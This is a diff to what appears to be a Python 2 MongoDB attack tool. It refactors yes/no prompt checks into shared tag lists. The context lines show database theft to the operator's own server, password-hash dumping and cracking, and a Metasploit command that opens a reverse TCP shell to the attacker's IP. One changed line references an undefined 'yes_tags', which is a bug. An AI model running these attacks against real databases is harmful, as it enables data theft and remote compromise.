@@ -35,6 +35,10 @@ from hashlib import md5
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
 optionSet = [False,False,False,False,False,False,False,False]
+global yes_tag
+global no_tag
+yes_tag = ['y', 'Y']
+no_tag = ['n', 'N']
 global victim
 global webPort
 global uri
@@ -373,7 +377,7 @@ def netAttacks(target):
 	
 	srvNeedCreds = raw_input("Does the database server need credentials (y/n)? ")
 	
-	if srvNeedCreds == "n" or srvNeedCreds == "N":
+	if srvNeedCreds in no_tag:
 		
 		try:
 			conn = pymongo.MongoClient(target,dbPort)
@@ -383,7 +387,7 @@ def netAttacks(target):
 		except:
 			print "MongoDB port closed."					
 	
-	elif srvNeedCreds == "y" or srvNeedCreds == "Y":
+	elif srvNeedCreds in yes_tag:
 		srvUser = raw_input("Enter server username: ")
 		srvPass = raw_input("Enter server password: ")
 		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"
@@ -406,7 +410,7 @@ def netAttacks(target):
 			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
 			testRest = raw_input("Start tests for REST Interface (y/n)? ")
 
-		if testRest == "y" or testRest == "Y":
+		if testRest in yes_tag:
 			restUrl = mgtUrl + "/listDatabases?text=1"
 			restResp = urllib.urlopen(restUrl).read()
 			restOn = restResp.find('REST is not enabled.')
@@ -471,7 +475,7 @@ def netAttacks(target):
 						print "\n"
 						crack = raw_input("Crack this hash (y/n)? ")
 						
-						if crack == "y":
+						if crack in yes_tag:
 							brute_pass(users[x]['user'],users[x]['pwd'])
 					
 		except:
@@ -482,7 +486,7 @@ def netAttacks(target):
 		
 		testGrid = raw_input("Check for GridFS (y/n)? ")
 		
-		if testGrid == "y" or testGrid == "Y":
+		if testGrid in yes_tag:
 			try:
 				for dbItem in dbList:
 					try:
@@ -500,12 +504,12 @@ def netAttacks(target):
 							
 		stealDB = raw_input("Steal a database (y/n-Requires your own Mongo server)?: ")
 		
-		if stealDB == "y" or stealDB == "Y":
+		if stealDB in yes_tag:
 			stealDBs (myIP)
 			
 		getShell = raw_input("Try to get a shell? (y/n-Requrires mongoDB <2.2.4)? ")
 		
-		if getShell == "y" or getShell == "Y":
+		if getShell in yes_tag:
 			#Launch Metasploit exploit
 			try:
 				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
@@ -783,7 +787,7 @@ def postApps():
 		
 		fileOut = raw_input("Save results to file (y/n)? ")
 		
-		if fileOut == "y" or fileOut == "Y":
+		if fileOut in yes_tag:
 			savePath = raw_input("Enter output file name: ")
 			fo = open(savePath, "wb")
 			fo.write ("Vulnerable Requests:\n")
@@ -964,7 +968,7 @@ def getApps():
 		print "\n"
 		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
 		
-		if doTimeAttack == "y" or doTimeAttack == "Y":
+		if doTimeAttack in yes_tags:
 			print "Starting Javascript string escape time based injection..."
 			start = time.time()
 			strTimeInj = urllib.urlopen(uriArray[8])
@@ -1004,7 +1008,7 @@ def getApps():
 		if lt24 == True:
 			bfInfo = raw_input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
 			
-			if bfInfo == "y" or bfInfo == "Y":
+			if bfInfo in yes_tag:
 				getDBInfo()
 				
 		
@@ -1028,7 +1032,7 @@ def getApps():
 		
 		fileOut = raw_input("Save results to file (y/n)? ")
 		
-		if fileOut == "y" or fileOut == "Y":
+		if fileOut in yes_tag:
 			savePath = raw_input("Enter output file name: ")
 			fo = open(savePath, "wb")
 			fo.write ("Vulnerable URLs:\n")
@@ -1287,7 +1291,7 @@ def stealDBs(myDB):
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
 		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
 		
-		if dbNeedCreds == "n" or dbNeedCreds == "N":
+		if dbNeedCreds in no_tag:
 			if optionSet[4] == False:
 				raw_input("No IP specified to copy to! Press enter to return to main menu...")
 				return
@@ -1295,7 +1299,7 @@ def stealDBs(myDB):
 			myDBConn = pymongo.MongoClient(myDB,27017)
 			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
 		
-		elif dbNeedCreds == "y" or dbNeedCreds == "Y":
+		elif dbNeedCreds in yes_tag:
 			dbUser = raw_input("Enter database username: ")
 			dbPass = raw_input("Enter database password: ")
 			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
@@ -1306,7 +1310,7 @@ def stealDBs(myDB):
 			
 		cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
 		
-		if cloneAnother == "y" or cloneAnother == "Y":
+		if cloneAnother in yes_tag:
 			stealDBs(myDB)
 		
 		else:
@@ -1491,7 +1495,7 @@ def getDBInfo():
 	
 	getUserInf = raw_input("Get database users and password hashes (y/n)? ")
 	
-	if getUserInf == "y" or getUserInf == "Y":
+	if getUserInf in yes_tag:
 		charCounter = 0
 		nameCounter = 0
 		#find the total number of users on the database
@@ -1627,7 +1631,7 @@ def getDBInfo():
 				pwdHash = ""
 	crackHash = raw_input("Crack recovered hashes (y/n)?:  ")		
 		
-	while crackHash == "y" or crackHash == "Y":
+	while crackHash in yes_tag:
 		menuItem = 1
 		for user in users:
 			print str(menuItem) + "-" + user
